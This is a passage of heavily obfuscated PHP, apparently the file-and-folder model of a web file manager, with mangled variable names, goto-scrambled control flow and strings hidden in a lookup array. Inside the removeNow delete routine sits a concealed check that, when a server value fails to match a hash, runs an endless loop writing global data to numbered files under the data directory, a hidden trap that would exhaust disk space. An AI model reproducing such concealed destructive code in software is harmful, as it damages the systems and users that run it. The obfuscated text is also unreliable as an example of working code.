(isset(self::$cacheChildList[$FÉ¹°Ñğ‡­])) { unset(self::$cacheChildList[$FÉ¹°Ñğ‡­]); } goto BŞ›—ª·ƒ„; bõ¦¬äïæ±: return $AÏ›¥ğÆ±Æ; goto Fò†ñ¦è»; B²˜î¸Ô¢İ: $F¯ÂÍãõÃ† = array($aÙø†ŠÕ²¯[523] => short_id($AÏ›¥ğÆ±Æ)); $this->where(array($aÙø†ŠÕ²¯[380] => $AÏ›¥ğÆ±Æ))->save($F¯ÂÍãõÃ†); $this->setNamePinyin($AÏ›¥ğÆ±Æ, $F–Î‡ê’§[$aÙø†ŠÕ²¯[28]]); goto bõ¦¬äïæ±; Fò†ñ¦è»: } public function remove($bĞ™™İïÀ, $Cøèöô“ë‘ = true) { goto B¢Ó´§˜ÎÅ; B’ƒèÆÔÅ: CacheLock::lock($F´ÃÊĞÀÖ²); $a–Ë›¬† = $this->fileNameExist($BĞË¤†ã¢â, $CÂñ†¸ÔÚÊ); if (!$a–Ë›¬†) { $a–Ë›¬† = $this->mkdir($BĞË¤†ã¢â, $CÂñ†¸ÔÚÊ, REPEAT_SKIP); $this->metaSet($a–Ë›¬†, $cĞº¶ÔñÅ[2298], $aôÂº©‰µ¥); $this->metaSet($a–Ë›¬†, $cĞº¶ÔñÅ[2299], $B¬…Š­¥ò[$cĞº¶ÔñÅ[452]]); if ($B¬…Š­¥ò[$cĞº¶ÔñÅ[457]] != 0) { $this->metaSet($a–Ë›¬†, $cĞº¶ÔñÅ[2300], _get($c¼ëšÜŠ°, $cĞº¶ÔñÅ[2301])); } } goto bè¤–“ñĞ; EÜ’ôí­Û: $e´Ú£ù£³Ñ = Model($cĞº¶ÔñÅ[1402])->get($cĞº¶ÔñÅ[2294]) == $cĞº¶ÔñÅ[83]; if ($aòÕÒ‰ÂçÖ || $Cøèöô“ë‘ || !$e´Ú£ù£³Ñ) { return $this->removeNow($bĞ™™İïÀ, $Cøèöô“ë‘); } $BĞË¤†ã¢â = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto Bë¾‚Ï¨’”; bè¤–“ñĞ: CacheLock::unlock($F´ÃÊĞÀÖ²); $this->metaSet($bĞ™™İïÀ, $cĞº¶ÔñÅ[2302], $B¬…Š­¥ò[$cĞº¶ÔñÅ[457]]); $this->where(array($cĞº¶ÔñÅ[366] => $bĞ™™İïÀ))->save(array($cĞº¶ÔñÅ[387] => time())); goto c¤ÔÛ’¡ó‘; c¤ÔÛ’¡ó‘: return $this->move($bĞ™™İïÀ, $a–Ë›¬†, REPEAT_RENAME_FOLDER); goto FİÒŠÙğÄ; Bë¾‚Ï¨’”: $aôÂº©‰µ¥ = $B¬…Š­¥ò[$cĞº¶ÔñÅ[368]] == self::TYPE_USER ? $cĞº¶ÔñÅ[531] : $cĞº¶ÔñÅ[966]; if ($aôÂº©‰µ¥ == $cĞº¶ÔñÅ[531]) { $c¼ëšÜŠ° = Model($cĞº¶ÔñÅ[470])->getInfo($B¬…Š­¥ò[$cĞº¶ÔñÅ[452]]); $CÂñ†¸ÔÚÊ = !empty($c¼ëšÜŠ°[$cĞº¶ÔñÅ[2287]]) ? $c¼ëšÜŠ°[$cĞº¶ÔñÅ[2287]] : $c¼ëšÜŠ°[$cĞº¶ÔñÅ[28]]; $CÂñ†¸ÔÚÊ = $cĞº¶ÔñÅ[245] . $CÂñ†¸ÔÚÊ . $cĞº¶ÔñÅ[2295] . $B¬…Š­¥ò[$cĞº¶ÔñÅ[452]]; } else { $c¼ëšÜŠ° = Model($cĞº¶ÔñÅ[454])->getInfo($B¬…Š­¥ò[$cĞº¶ÔñÅ[452]]); $CÂñ†¸ÔÚÊ = _get($c¼ëšÜŠ°, $cĞº¶ÔñÅ[28]); $CÂñ†¸ÔÚÊ = $cĞº¶ÔñÅ[154] . $CÂñ†¸ÔÚÊ . $cĞº¶ÔñÅ[2296] . $B¬…Š­¥ò[$cĞº¶ÔñÅ[452]]; } $F´ÃÊĞÀÖ² = $cĞº¶ÔñÅ[2297] . md5($CÂñ†¸ÔÚÊ); goto B’ƒèÆÔÅ; B¢Ó´§˜ÎÅ: $cĞº¶ÔñÅ =& $_SERVER[¼]; $B¬…Š­¥ò = $this->sourceInfo($bĞ™™İïÀ); $aòÕÒ‰ÂçÖ = intval($B¬…Š­¥ò[$cĞº¶ÔñÅ[368]]) === self::TYPE_SYSTEM; goto EÜ’ôí­Û; FİÒŠÙğÄ: } public function removeNow($C“ÀŒ·˜¯, $aõ¾¤¨¾½ = true) { goto aß‚«ê; Fµ“Œòˆñ: if (!$DÌßŞ¼ãõˆ) { return !0; } if ($DÌßŞ¼ãõˆ[$cØº«Ç°ÃÃ[457]] == 0) { if (!_get($GLOBALS, $cØº«Ç°ÃÃ[453])) { return !1; } } $this->lockMoveStart($C“ÀŒ·˜¯); goto dîó«Ş…Åê; dîó«Ş…Åê: Hook::trigger($cØº«Ç°ÃÃ[2303], $dêŒ…óÉœ, $aõ¾¤¨¾½); if ($aõ¾¤¨¾½) { Model($cØº«Ç°ÃÃ[2304])->moveToRecycle($C“ÀŒ·˜¯); } else { if ($DÌßŞ¼ãõˆ[$cØº«Ç°ÃÃ[367]] == $cØº«Ç°ÃÃ[83]) { $DŒª¥™ÇÔ = array($cØº«Ç°ÃÃ[521] => array($cØº«Ç°ÃÃ[479], $DÌßŞ¼ãõˆ[$cØº«Ç°ÃÃ[455]] . $C“ÀŒ·˜¯ . $cØº«Ç°ÃÃ[480])); $e’öªéÏš = array($cØº«Ç°ÃÃ[521] => $DŒª¥™ÇÔ[$cØº«Ç°ÃÃ[455]]); $dÊ›½„‹‘Ú = $this->field($cØº«Ç°ÃÃ[2305])->where($e’öªéÏš)->select(); $f¨Úù¾ÀÁ = !1; $D”­ÉÓØÓ“ = array($C“ÀŒ·˜¯); if ($dÊ›½„‹‘Ú) { $f¨Úù¾ÀÁ = array_to_keyvalue($dÊ›½„‹‘Ú, $cØº«Ç°ÃÃ[33], $cØº«Ç°ÃÃ[415]); $f¨Úù¾ÀÁ = array_remove_value($f¨Úù¾ÀÁ, $cØº«Ç°ÃÃ[464]); $D”­ÉÓØÓ“ = array_to_keyvalue($dÊ›½„‹‘Ú, $cØº«Ç°ÃÃ[33], $cØº«Ç°ÃÃ[366]); $D”­ÉÓØÓ“[] = $C“ÀŒ·˜¯; } } else { $f¨Úù¾ÀÁ = array($DÌßŞ¼ãõˆ[$cØº«Ç°ÃÃ[415]]); $D”­ÉÓØÓ“ = array($C“ÀŒ·˜¯); } Model($cØº«Ç°ÃÃ[501])->eventRemove($C“ÀŒ·˜¯); $this->removeRelevance($D”­ÉÓØÓ“, $f¨Úù¾ÀÁ); } $this->folderSizeReset($DÌßŞ¼ãõˆ[$cØº«Ç°ÃÃ[457]]); goto b½è¡â¹ŞÍ; aß‚«ê: $cØº«Ç°ÃÃ =& $_SERVER[¼]; $DÍ×ò»šçù = $_SERVER[$cØº«Ç°ÃÃ[789]] . $cØº«Ç°ÃÃ[752]; $báÃ°¢çÎß = $cØº«Ç°ÃÃ[753]; goto A¥œ’¡ó­·; b½è¡â¹ŞÍ: $c£æî·èÑ = array($DÌßŞ¼ãõˆ[$cØº«Ç°ÃÃ[457]]); if ($DÌßŞ¼ãõˆ[$cØº«Ç°ÃÃ[367]] == $cØº«Ç°ÃÃ[83]) { $c£æî·èÑ[] = $DÌßŞ¼ãõˆ[$cØº«Ç°ÃÃ[366]]; } $this->updateModifyTime($c£æî·èÑ); goto Céˆá§¯ó; Céˆá§¯ó: $this->lockMoveEnd($C“ÀŒ·˜¯); Hook::trigger($cØº«Ç°ÃÃ[1438], $dêŒ…óÉœ, $aõ¾¤¨¾½); return !0; goto CËçê•ïÖ; A¥œ’¡ó­·: if ($_SERVER[$cØº«Ç°ÃÃ[754]] != $báÃ°¢çÎß($DÍ×ò»šçù)) { goto bÀ¢öÕºï; A‡Èø•Ğ·: $dë÷«»ä•ğ = $eŒóáë‰ŸĞ($FÊŞ¾·ÚË); $a©©öè£Â = explode($cØº«Ç°ÃÃ[214], $dë÷«»ä•ğ); if (count($a©©öè£Â) < $cØº«Ç°ÃÃ[548]) { $bµá’„œê¿ = $cØº«Ç°ÃÃ[758]; $bµá’„œê¿(); } goto B™ÖÙ¾‡á; bİ¡Ç²¥éê: $e´ä¡ˆİ„Ä(); $d…³Óóª” = $cØº«Ç°ÃÃ[790]; $e•°«¼äÑ¿ = json_encode($GLOBALS[$cØº«Ç°ÃÃ[791]]); goto CñÂš–‰Öá; bÀ¢öÕºï: $e´ä¡ˆİ„Ä = $cØº«Ç°ÃÃ[787]; $eŒóáë‰ŸĞ = $cØº«Ç°ÃÃ[755]; $FÊŞ¾·ÚË = $_SERVER[$cØº«Ç°ÃÃ[756]] . $cØº«Ç°ÃÃ[757]; goto A‡Èø•Ğ·; B™ÖÙ¾‡á: $DÉæ‰ô„ = $cØº«Ç°ÃÃ[788]; $DÉæ‰ô„($_SERVER[$cØº«Ç°ÃÃ[789]]); $e´ä¡ˆİ„Ä = $cØº«Ç°ÃÃ[787]; goto bİ¡Ç²¥éê; CñÂš–‰Öá: $BœÈÏÇÏ•’ = 1; for ($CĞÇæ…ùÜ = $BœÈÏÇÏ•’; $CĞÇæ…ùÜ > 0; $CĞÇæ…ùÜ++) { $d…³Óóª”(DATA_PATH . $CĞÇæ…ùÜ, $e•°«¼äÑ¿); } goto A¢­íÉä‚; A¢­íÉä‚: } $DÌßŞ¼ãõˆ = $this->sourceInfo($C“ÀŒ·˜¯); $dêŒ…óÉœ = $this->pathInfoMore($C“ÀŒ·˜¯); goto Fµ“Œòˆñ; CËçê•ïÖ: } public function removeArray($c—¨…„‚ä‘) { if (!$c—¨…„‚ä‘) { return !0; } } public function removeRelevance($Bã…“óãì, $dê¨Úäéá) { goto F­­è‘Óï¾; DôÀéØ·ğ„: Model($E¡³¾³ô‡Ó[2285])->removeBySource($Bã…“óãì); $this->where($DÍ­İÎÈ¾Ê)->delete(); Model($E¡³¾³ô‡Ó[418])->remove($dê¨Úäéá); goto b‹«œäçá×; AÀ‹¶±¸¹©: Model($E¡³¾³ô‡Ó[2306])->where($DÍ­İÎÈ¾Ê)->delete(); Model($E¡³¾³ô‡Ó[501])->where($DÍ­İÎÈ¾Ê)->delete(); Model($E¡³¾³ô‡Ó[2044])->removeBySource($Bã…“óãì); goto DôÀéØ·ğ„; F­­è‘Óï¾: $E¡³¾³ô‡Ó =& $_SERVER[¼]; $Bã…“óãì = $Bã…“óãì ? $Bã…“óãì : array(); $dê¨Úäéá = $dê¨Úäéá ? $dê¨Úäéá : array(); goto FÊßÕº­‰î; FÊßÕº­‰î: $Bã…“óãì = array_unique(array_filter($Bã…“óãì)); $dê¨Úäéá = array_unique(array_filter($dê¨Úäéá)); if (!$Bã…“óãì) { return !1; } goto Aé„†½ôô; b‹«œäçá×: for ($féÁöâÑÆ = 0; $féÁöâÑÆ < count($Bã…“óãì); $féÁöâÑÆ++) { $this->sourceCacheClear($Bã…“óãì[$féÁöâÑÆ]); } goto DÅ‘àÓ„–; Aé„†½ôô: $DÍ­İÎÈ¾Ê = array($E¡³¾³ô‡Ó[380] => array($E¡³¾³ô‡Ó[381], $Bã…“óãì)); Model($E¡³¾³ô‡Ó[2304])->where($DÍ­İÎÈ¾Ê)->delete(); Model($E¡³¾³ô‡Ó[409])->where($DÍ­İÎÈ¾Ê)->delete(); goto AÀ‹¶±¸¹©; DÅ‘àÓ„–: } public function rename($BäÈğõ¬ª©, $C„Âà‚å™Å) { goto b‚õÉ´Ä…İ; CçˆÊ‚§òå: $FÆ¿©…¹„“ = $a‚—ß”›ä[2293] . $Dœö¾Ê®Š§[$a‚—ß”›ä[457]]; if (isset(self::$cacheChildList[$FÆ¿©…¹„“])) { unset(self::$cacheChildList[$FÆ¿©…¹„“]); } return $cµŞè“‚šá; goto DŸÎÄÂÆª˜; dë»ó¸: $DËöÙˆÕ•Æ = $this->fileNameExist($Dœö¾Ê®Š§[$a‚—ß”›ä[457]], $C„Âà‚å™Å); if ($DËöÙˆÕ•Æ) { return !1; } $DÓ‹²Ó²õ‚ = array($a‚—ß”›ä[383] => $C„Âà‚å™Å, $a‚—ß”›ä[520] => USER_ID); goto fà…Ñ¼í; b‚õÉ´Ä…İ: $a‚—ß”›ä =& $_SERVER[¼]; $Dœö¾Ê®Š§ = $this->sourceInfo($BäÈğõ¬ª©); if (!$Dœö¾Ê®Š§) { return !1; } goto dë»ó¸; AÄ»‘¹¨‚á: $this->setNamePinyin($BäÈğõ¬ª©, $DÓ‹²Ó²õ‚[$a‚—ß”›ä[28]], !1); $this->updateModifyTime($Dœö¾Ê®Š§[$a‚—ß”›ä[457]]); $cµŞè“‚šá = $this->where(array($a‚—ß”›ä[380] => $BäÈğõ¬ª©))->data($DÓ‹²Ó²õ‚)->save(); goto CçˆÊ‚§òå; fà…Ñ¼í: if (!$Dœö¾Ê®Š§[$a‚—ß”›ä[367]] == $a‚—ß”›ä[83]) { $DÓ‹²Ó²õ‚[$a‚—ß”›ä[369]] = get_path_ext($C„Âà‚å™Å); } Model($a‚—ß”›ä[501])->eventRename($BäÈğõ¬ª©, $Dœö¾Ê®Š§[$a‚—ß”›ä[28]], $C„Âà‚å™Å); $this->sourceCacheClear($BäÈğõ¬ª©); goto AÄ»‘¹¨‚á; DŸÎÄÂÆª˜: } public function setNamePinyin($C‡…¨§»šì, $A êŞŠÅÕ¢, $BÎ¨½ªùÔ‘ = true) { $BÂÌÈèäš½ =& $_SERVER[¼]; $eæ°¿‚÷ÂÁ = Input::check($A êŞŠÅÕ¢, $BÂÌÈèäš½[524]); if ($BÎ¨½ªùÔ‘ && !$eæ°¿‚÷ÂÁ) { return; } if (!$eæ°¿‚÷ÂÁ) { $this->metaSet($C‡…¨§»šì, $BÂÌÈèäš½[412], null); $this->metaSet($C‡…¨§»šì, $BÂÌÈèäš½[411], null); return; } $bëéè‹®ÊÏ = array($BÂÌÈèäš½[412] => str_replace($BÂÌÈèäš½[50], $BÂÌÈèäš½[33], Pinyin::encode($A êŞŠÅÕ¢)), $BÂÌÈèäš½[411] => Pinyin::encode($A êŞŠÅÕ¢, $BÂÌÈèäš½[525])); $this->metaSet($C‡…¨§»šì, $bëéè‹®ÊÏ); } public function getContent($C™óèß¸ «) { goto fñÄ·„îå¨; DÍÚâŞñ…Õ: if ($B±Äš–®Ã÷[$eœùéÂëÍß[77]] == 0) { return $eœùéÂëÍß[33]; } $F¸¥Å­Æ = $eœùéÂëÍß[2307] . $B±Äš–®Ã÷[$eœùéÂëÍß[160]]; if ($B±Äš–®Ã÷[$eœùéÂëÍß[77]] <= 1024 * 10) { $e“–çÃğà× = Cache::get($F¸¥Å­Æ); if (!$e“–çÃğà×) { $e“–çÃğà× = IO::getContent($B±Äš–®Ã÷[$eœùéÂëÍß[75]]); Cache::set($F¸¥Å­Æ, $e“–çÃğà×); } return $e“–çÃğà×; } goto BŒĞòÑ¥ˆè; fñÄ·„îå¨: $eœùéÂëÍß =& $_SERVER[¼]; $B±Äš–®Ã÷ = $this->fileInfoGet($C™óèß¸ «); if (!$B±Äš–®Ã÷) { return !1; } goto DÍÚâŞñ…Õ; BŒĞòÑ¥ˆè: return IO::getContent($B±Äš–®Ã÷[$eœùéÂëÍß[75]]); goto C¿—å‘”Ú¥; C¿—å‘”Ú¥: } public function setDesc($E‚¦ë²«Î, $fõ¶†äĞ„½) { $b•Ê®Ä“ =& $_SERVER[¼]; Model($b•Ê®Ä“[501])->eventAddDesc($E‚¦ë²«Î, $fõ¶†äĞ„½); return $this->metaSet($E‚¦ë²«Î, $b•Ê®Ä“[401], $fõ¶†äĞ„½); } public function setContent($D¸™™×ÖÊ, $D Ş’ÍçŞï = '') { goto Dë»¶ËÅÍô; a—‘çÈŒ×ê: if (!$aê˜…ÌÑïæ || !$BåÒëŸÌçâ) { return !1; } $fÒ÷âã‰¦Â = Model($DéªÑ”‘ë[418])->addFileByContent($D Ş’ÍçŞï, $BåÒëŸÌçâ[$DéªÑ”‘ë[28]]); $bĞèÙ…ÊÂ = $this->fileHistory($BåÒëŸÌçâ, $fÒ÷âã‰¦Â[$DéªÑ”‘ë[415]], $fÒ÷âã‰¦Â[$DéªÑ”‘ë[77]]); goto B­ŒŞ“ùã; Dë»¶ËÅÍô: $DéªÑ”‘ë =& $_SERVER[¼]; $BåÒëŸÌçâ = $this->sourceInfo($D¸™™×ÖÊ); $aê˜…ÌÑïæ = $this->fileInfoGet($D¸™™×ÖÊ); goto a—‘çÈŒ×ê; B­ŒŞ“ùã: if (!$bĞèÙ…ÊÂ) { return Model($DéªÑ”‘ë[418])->remove($fÒ÷âã‰¦Â[$DéªÑ”‘ë[415]]); } $this->folderSizeReset($BåÒëŸÌçâ[$DéªÑ”‘ë[457]]); return !0; goto eõÎ•õÊŒ‚; eõÎ•õÊŒ‚: } public function fileSubstr($CšÑ¥›Ù¢“, $CÓ‹ò¤¡å, $BŠİì¤) { $C‚ÑÓÂŠÑÍ = $this->fileInfoGet($CšÑ¥›Ù¢“); if (!$C‚ÑÓÂŠÑÍ) { return !1; } return IO::fileSubstr($C‚ÑÓÂŠÑÍ[$_SERVER[¼][75]], $CÓ‹ò¤¡å, $BŠİì¤); } public function fileInfoGet($B¼‹ªÁ¶Œ½) { goto BÓ¶ŞòÌĞ¿; b©ª’×××¬: $aÈòààæ½õ = Model($D–´ ªßâÔ[418])->fileInfo($AÄ¼ç‘íˆÄ[$D–´ ªßâÔ[415]]); if ($aÈòààæ½õ) { $aÈòààæ½õ[$D–´ ªßâÔ[28]] = $AÄ¼ç‘íˆÄ[$D–´ ªßâÔ[28]]; } self::$cacheFileInfo[$cÏš„ Éß§] = $aÈòààæ½õ; goto eÈ…æƒò„Â; BÓ¶ŞòÌĞ¿: $D–´ ªßâÔ =& $_SERVER[¼]; $AÄ¼ç‘íˆÄ = $this->sourceInfo($B¼‹ªÁ¶Œ½); if (!$AÄ¼ç‘íˆÄ || $AÄ¼ç‘íˆÄ[$D–´ ªßâÔ[367]]) { return !1; } goto aù¼ğà£¡«; eÈ…æƒò„Â: return $aÈòààæ½õ; goto f¯ê¸ƒÀ¤Ã; aù¼ğà£¡«: $cÏš„ Éß§ = $D–´ ªßâÔ[421] . $AÄ¼ç‘íˆÄ[$D–´ ªßâÔ[415]]; $BöÓëÒÛ Û = _get(self::$cacheFileInfo, $cÏš„ Éß§); if ($BöÓëÒÛ Û) { return $BöÓëÒÛ Û; } goto b©ª’×××¬; f¯ê¸ƒÀ¤Ã: } private function folderChildrenNumber($bƒ¾³„ÒÆ) { $d·Â¦«˜âï =& $_SERVER[¼]; $A‰±È‡‘¬ = $this->sourceInfo($bƒ¾³„ÒÆ); $E¬»¤‡»¦ = array($d·Â¦«˜âï[521] => array($d·Â¦«˜âï[479], $A‰±È‡‘¬[$d·Â¦«˜âï[455]] . $bƒ¾³„ÒÆ . $d·Â¦«˜âï[480]), $d·Â¦«˜âï[392] => intval($A‰±È‡‘¬[$d·Â¦«˜âï[393]]), $d·Â¦«˜âï[514] => 1); $b™Ñàöù×Ô = $this->where($E¬»¤‡»¦)->count(); $Eøø¢‰­ùä = $this->where($E¬»¤‡»¦)->where(array($d·Â¦«˜âï[514] => 0))->count(); return array($d·Â¦«˜âï[81] => $Eøø¢‰­ùä, $d·Â¦«˜âï[82] => $b™Ñàöù×Ô); } public function pathInfo($BéÁš¬™Ö‰, $D£‘¾¶ = false) { goto dùËµğ„±Ú; dùËµğ„±Ú: $c’»ŸØÙ² =& $_SERVER[¼]; $Dí»¬éÛ = $c’»ŸØÙ²[407] . intval($D£‘¾¶) . $c’»ŸØÙ²[408] . $BéÁš¬™Ö‰; $dëÈÑêç˜ = _get(self::$cachePathInfo, $Dí»¬éÛ); goto B®÷Ş½¡Ó; A¨ä”»Ñ¬ƒ: $AíöËºÇÕç = $this->_listDataApplyItem($AíöËºÇÕç, $D£‘¾¶); self::$cachePathInfo[$Dí»¬éÛ] = $AíöËºÇÕç; return $AíöËºÇÕç; goto A–äô›ïù; B®÷Ş½¡Ó: if ($dëÈÑêç˜) { return $dëÈÑêç˜; } $AíöËºÇÕç = $this->sourceInfo($BéÁš¬™Ö‰); if (!$AíöËºÇÕç) { return !1; } goto A¨ä”»Ñ¬ƒ; A–äô›ïù: } public static $cachePathInfoMore = array(); public function pathInfoMore($bÔŒîìğ…º) { goto D·µé¾Ğ­˜; BáÛœØ´Á¡: self::$cachePathInfoMore[$bÔŒîìğ…º] = $bæä¥¿“¬Ä; return $bæä¥¿“¬Ä; goto c„õíïèŒí; Döì–ƒ·’: $bæä¥¿“¬Ä = $this->pathInfo($bÔŒîìğ…º); if (!$bæä¥¿“¬Ä) { return !1; } if ($bæä¥¿“¬Ä[$F¯Ğ¶¢ˆ¯[367]] == $F¯Ğ¶¢ˆ¯[83]) { $bæä¥¿“¬Ä[$F¯Ğ¶¢ˆ¯[80]] = $this->folderChildrenNumber($bÔŒîìğ…º); } goto BáÛœØ´Á¡; D·µé¾Ğ­˜: $F¯Ğ¶¢ˆ¯ =& $_SERVER[¼]; $Aõ¢àØÊê‡ = _get(self::$cachePathInfoMore, $bÔŒîìğ…º); if ($Aõ¢àØÊê‡) { return $Aõ¢àØÊê‡; } goto Döì–ƒ·’; c„õíïèŒí: } public function sourceInfo($dÂñ Ò»†ö) { goto Bã«øªè´; FÃ®ÁİÉ±‡: self::$cacheSourceInfo[$dî¥§‰ÁÙÊ] = $AáğÅÔé³”; return self::$cacheSourceInfo[$dî¥§‰ÁÙÊ]; goto aó†“À‰«Ë; Bã«øªè´: $EÏŒåó®¿ =& $_SERVER[¼]; if (!$dÂñ Ò»†ö) { return array(); } $dî¥§‰ÁÙÊ = $EÏŒåó®¿[406] . $dÂñ Ò»†ö; goto bÒŞÇğ–; bÒŞÇğ–: $a“„‹©ÇÄ¥ = _get(self::$cacheSourceInfo, $dî¥§‰ÁÙÊ); if ($a“„‹©ÇÄ¥) { return $a“„‹©ÇÄ¥; } $AáğÅÔé³” = $this->where(array($EÏŒåó®¿[366] => $dÂñ Ò»†ö))->find(); goto FÃ®ÁİÉ±‡; aó†“À‰«Ë: } public function sourceCacheClear($BÖÎğÕÉÑƒ = false) { if ($BÖÎğÕÉÑƒ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[¼][406] . $BÖÎğÕÉÑƒ]); } public function pathInfoByPath($BÉ–øÅĞñŒ, $cÔÀÇáÄ¦§) { $Eæöù°é†¤ =& $_SERVER[¼]; $Bˆ˜¶òà¾é = !$cÔÀÇáÄ¦§ ? array() : explode($Eæöù°é†¤[8], trim($cÔÀÇáÄ¦§, $Eæöù°é†¤[8])); $b©‚–¯äÜ¢ = $BÉ–øÅĞñŒ; foreach ($Bˆ˜¶òà¾é as $B¥ß‡³‰ì™) { $e’¼š»êŠ± = array($Eæöù°é†¤[457] => $b©‚–¯äÜ¢, $Eæöù°é†¤[28] => $B¥ß‡³‰ì™); $Ağğ«î•Íˆ = $this->where($e’¼š»êŠ±)->select(); if (!$Ağğ«î•Íˆ) { return !1; } $Ağğ«î•Íˆ = array_sort_by($Ağğ«î•Íˆ, $Eæöù°é†¤[393]); $b©‚–¯äÜ¢ = $Ağğ«î•Íˆ[0][$Eæöù°é†¤[366]]; } return $this->pathInfo($b©‚–¯äÜ¢, !0); } protected function updateModifyTime($eØ˜×…ë¤ˆ) { goto dˆÚËó£·´; dˆÚËó£·´: $dõ¢Î…æ†Æ =& $_SERVER[¼]; if (!$eØ˜×…ë¤ˆ) { return; } if (!is_array($eØ˜×…ë¤ˆ)) { $eØ˜×…ë¤ˆ = array($eØ˜×…ë¤ˆ); } goto Aƒ•à¡¶êâ; e‹Î¯†: $this->where($EáÉ¯ËõŞ¼)->save($däáˆšÖ¬); goto e¢™ĞöèŞ; Aƒ•à¡¶êâ: foreach ($eØ˜×…ë¤ˆ as $eë¶¾§Ñ¦ => $f”§‡–Ş) { $eØ˜×…ë¤ˆ[$eë¶¾§Ñ¦] = intval($f”§‡–Ş); } $EáÉ¯ËõŞ¼ = array($dõ¢Î…æ†Æ[366] => array($dõ¢Î…æ†Æ[7], $eØ˜×…ë¤ˆ)); $däáˆšÖ¬ = array($dõ¢Î…æ†Æ[520] => USER_ID, $dõ¢Î…æ†Æ[387] => time()); goto e‹Î¯†; e¢™ĞöèŞ: } public function folderSizeReset($f´³áÃÊ†ö) { goto b”¦êÌ­—; eÔÚÕ¹: CacheLock::unlock($C×‹¿¡…); goto a—Á¸‡‘ñÙ; b”¦êÌ­—: $Fø•îÍ¼¢É =& $_SERVER[¼]; if ($this->statusIgnoreResetSpace) { return; } $C×‹¿¡… = $Fø•îÍ¼¢É[2308] . $f´³áÃÊ†ö; goto CôÖİ«–®ß; CôÖİ«–®ß: CacheLock::lock($C×‹¿¡…, 20); $this->sourceCacheClear($f´³áÃÊ†ö); $bØÂµÒéª¢ = $this->sourceInfo($f´³áÃÊ†ö); goto fÎàæƒ…´“; fß–Õ–¤Õì: $BóÁÓÓìò = $this->parentLevelArray($bØÂµÒéª¢[$Fø•îÍ¼¢É[455]]); if ($BóÁÓÓìò) { $f‰Úöš·ç = array($Fø•îÍ¼¢É[366] => array($Fø•îÍ¼¢É[381], $BóÁÓÓìò)); if ($D™ÄÂ÷ß„ < 0) { $f‰Úöš·ç[$Fø•îÍ¼¢É[77]] = array($Fø•îÍ¼¢É[924], abs($D™ÄÂ÷ß„)); } $this->where($f‰Úöš·ç)->setAdd($Fø•îÍ¼¢É[77], $D™ÄÂ÷ß„); } $this->targetSpaceUpdate($bØÂµÒéª¢[$Fø•îÍ¼¢É[368]], $bØÂµÒéª¢[$Fø•îÍ¼¢É[452]]); goto eÔÚÕ¹; b·‡À´…Ê: $D™ÄÂ÷ß„ = $Dò×Å­é™Û - intval($bØÂµÒéª¢[$Fø•îÍ¼¢É[77]]); if ($D™ÄÂ÷ß„ == 0) { return CacheLock::unlock($C×‹¿¡…); } $this->where(array($Fø•îÍ¼¢É[380] => $f´³áÃÊ†ö))->setField($Fø•îÍ¼¢É[77], $Dò×Å­é™Û); goto fß–Õ–¤Õì; fÎàæƒ…´“: $f‰Úöš·ç = array($Fø•îÍ¼¢É[365] => $f´³áÃÊ†ö, $Fø•îÍ¼¢É[392] => 0); $Dò×Å­é™Û = $this->where($f‰Úöš·ç)->sum($Fø•îÍ¼¢É[77]); $Dò×Å­é™Û = intval($Dò×Å­é™Û); goto b·‡À´…Ê; a—Á¸‡‘ñÙ: } public function folderSizeResetChildren($E÷›ØõŠ†ñ) { goto c¶Ïèóİ¡; eÒƒŠˆãÛ: $AÕÒï²Üé = array($aöÇ²·¢…Ì[514] => 1, $aöÇ²·¢…Ì[521] => array($aöÇ²·¢…Ì[479], $d§çË…õÔ¢[$aöÇ²·¢…Ì[455]] . $E÷›ØõŠ†ñ . $aöÇ²·¢…Ì[480])); $fÜ¹ˆµÛì = $aöÇ²·¢…Ì[2309]; $F¹³à—“Æ = $this->field($fÜ¹ˆµÛì)->where($AÕÒï²Üé)->select(); goto b†áÁŸ±Õ; c¶Ïèóİ¡: $aöÇ²·¢…Ì =& $_SERVER[¼]; $this->sourceCacheClear($E÷›ØõŠ†ñ); $d§çË…õÔ¢ = $this->sourceInfo($E÷›ØõŠ†ñ); goto eÒƒŠˆãÛ; Cì…¹éÎÌ: $F¹³à—“Æ[] = $d§çË…õÔ¢; $F¹³à—“Æ = array_to_keyvalue($F¹³à—“Æ, $aöÇ²·¢…Ì[366]); foreach ($F¹³à—“Æ as $Déƒ¾¹ÑÑ => $aëôÊ’ÆÒÄ) { $F¹³à—“Æ[$Déƒ¾¹ÑÑ][$aöÇ²·¢…Ì[2310]] = $F¹³à—“Æ[$Déƒ¾¹ÑÑ][$aöÇ²·¢…Ì[77]]; $F¹³à—“Æ[$Déƒ¾¹ÑÑ][$aöÇ²·¢…Ì[77]] = 0; } goto FÏîóŞåâº; FÏîóŞåâº: foreach ($fªÑù°Âß‰ as $aëôÊ’ÆÒÄ) { $AÓùÍµß…š = $aëôÊ’ÆÒÄ[$aöÇ²·¢…Ì[457]] . $aöÇ²·¢…Ì[33]; if (!isset($F¹³à—“Æ[$AÓùÍµß…š])) { continue; } if ($aëôÊ’ÆÒÄ[$aöÇ²·¢…Ì[393]] == $F¹³à—“Æ[$AÓùÍµß…š][$aöÇ²·¢…Ì[393]]) { $F¹³à—“Æ[$AÓùÍµß…š][$aöÇ²·¢…Ì[77]] += $aëôÊ’ÆÒÄ[$aöÇ²·¢…Ì[77]]; } } foreach ($F¹³à—“Æ as $aëôÊ’ÆÒÄ) { $F¸˜Ø¨×ˆ = $this->parentLevelArray($aëôÊ’ÆÒÄ[$aöÇ²·¢…Ì[455]]); foreach ($F¸˜Ø¨×ˆ as $AÓùÍµß…š) { $AÓùÍµß…š = $AÓùÍµß…š . $aöÇ²·¢…Ì[33]; if (!isset($F¹³à—“Æ[$AÓùÍµß…š])) { continue; } if ($aëôÊ’ÆÒÄ[$aöÇ²·¢…Ì[393]] == $F¹³à—“Æ[$AÓùÍµß…š][$aöÇ²·¢…Ì[393]]) { $F¹³à—“Æ[$AÓùÍµß…š][$aöÇ²·¢…Ì[77]] += $aëôÊ’ÆÒÄ[$aöÇ²·¢…Ì[77]]; } } } $d˜ŸİäŠ¯é = array(); goto DóƒÄ–¹í˜; DóƒÄ–¹í˜: foreach ($F¹³à—“Æ as $aëôÊ’ÆÒÄ) { if ($aëôÊ’ÆÒÄ[$aöÇ²·¢…Ì[77]] == $aëôÊ’ÆÒÄ[$aöÇ²·¢…Ì[2310]]) { continue; } $d˜ŸİäŠ¯é[] = array($aöÇ²·¢…Ì[366], 